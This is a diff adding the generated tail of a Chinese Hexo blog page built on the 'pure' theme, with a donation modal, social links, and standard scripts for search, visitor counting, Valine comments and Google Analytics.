+      <a class="toggle-btn " data-toggle="collapse" href="#collapseToc" aria-expanded="false" title="文章目录" role="button">    <span>[&nbsp;</span><span>文章目录</span>
+        <i class="text-collapsed icon icon-anchor"></i>
+        <i class="text-in icon icon-close"></i>
+        <span>]</span>
+      </a>
+    </li>
+    
+  </ul>
+  
+  
+  <!-- Button trigger modal -->
+  <button type="button" class="btn btn-fancy btn-donate pop-onhover bg-gradient-warning" data-toggle="modal" data-target="#donateModal"><span>赏</span></button>
+  <!-- <div class="wave-icon wave-icon-danger btn-donate" data-toggle="modal" data-target="#donateModal">
+    <div class="wave-circle"><span class="icon"><i class="icon icon-bill"></i></span></div>
+  </div> -->
+  
+  
+  <div class="bar-right">
+    
+    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
+    
+  </div>
+  </div>
+</nav>
+  
+<!-- Modal -->
+<div class="modal modal-center modal-small modal-xs-full fade" id="donateModal" tabindex="-1" role="dialog">
+  <div class="modal-dialog" role="document">
+    <div class="modal-content donate">
+      <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+      <div class="modal-body">
+        <div class="donate-box">
+          <div class="donate-head">
+            <p>感谢您的支持，我会继续努力的!</p>
+          </div>
+          <div class="tab-content">
+            <div role="tabpanel" class="tab-pane fade active in" id="alipay">
+              <div class="donate-payimg">
+                <img src="/images/donate/alipayimg.png" alt="扫码支持" title="扫一扫">
+              </div>
+              <p class="text-muted mv">扫码打赏，你说多少就多少</p>
+              <p class="text-grey">打开支付宝扫一扫，即可进行扫码打赏哦</p>
+            </div>
+            <div role="tabpanel" class="tab-pane fade" id="wechatpay">
+              <div class="donate-payimg">
+                <img src="/images/wechat_pay.png" alt="扫码支持" title="扫一扫">
+              </div>
+              <p class="text-muted mv">扫码打赏，你说多少就多少</p>
+              <p class="text-grey">打开微信扫一扫，即可进行扫码打赏哦</p>
+            </div>
+          </div>
+          <div class="donate-footer">
+            <ul class="nav nav-tabs nav-justified" role="tablist">
+              <li role="presentation" class="active">
+                <a href="#alipay" id="alipay-tab" role="tab" data-toggle="tab" aria-controls="alipay" aria-expanded="true"><i class="icon icon-alipay"></i> 支付宝</a>
+              </li>
+              <li role="presentation" class="">
+                <a href="#wechatpay" role="tab" id="wechatpay-tab" data-toggle="tab" aria-controls="wechatpay" aria-expanded="false"><i class="icon icon-wepay"></i> 微信支付</a>
+              </li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+
+</main>
+
+  <footer class="footer" itemscope="" itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/yaoyuanyy" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="https://juejin.cn/user/729731449759047/posts" target="_blank" title="Juejin" data-toggle="tooltip" data-placement="top"><i class="icon icon-juejin"></i></a></li>
+        
+        <li><a href="https://blog.csdn.net/mingliangniwo" target="_blank" title="Csdn" data-toggle="tooltip" data-placement="top"><i class="icon icon-csdn"></i></a></li>
+        
+        <li><a href="https://yaoyuanyy.github.io" target="_blank" title="Github Pages" data-toggle="tooltip" data-placement="top"><i class="icon icon-github pages"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle="tooltip" data-placement="top"><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+        <div class="publishby">
+        	Theme by <a href="https://github.com/cofess" target="_blank"> cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.
+        </div>
+    </div>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+<script src="/js/plugin.min.js"></script>
+<script src="/js/application.js"></script>
+
+    <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+            UNTITLED: '(未命名)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+<script src="/js/insight.js"></script>
+
+
+
+
+
+   
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+   
+    
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/valine"></script>
+  <script type="text/javascript">
+  var GUEST = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link';
+  meta = meta.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#vcomments',
+    verify: false,
+    notify: false,
+    appId: 'FA5MfMbhgGSiEPOyVmYfHbR6-gzGzoHsz',
+    appKey: '2aAdTrUVOhFxm0uqpBFC1dhv',
+    placeholder: 'tell anything',
+    avatar: '',
+    meta: meta,
+    pageSize: '10' || 10,
+    visitor: false
+  });
+  </script>
+
+     
+
+
+
+
+
+    <!-- <script defer type="text/javascript">
+(function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'G-WR4XDKYXVY', 'auto');
+ga('send', 'pageview');
+
+</script> -->
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-WR4XDKYXVY"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag() { dataLayer.push(arguments); }
+    gtag('js', new Date());
+
+    gtag('config', 'G-WR4XDKYXVY');
+</script>
+
+
+
+</body>
+</html>
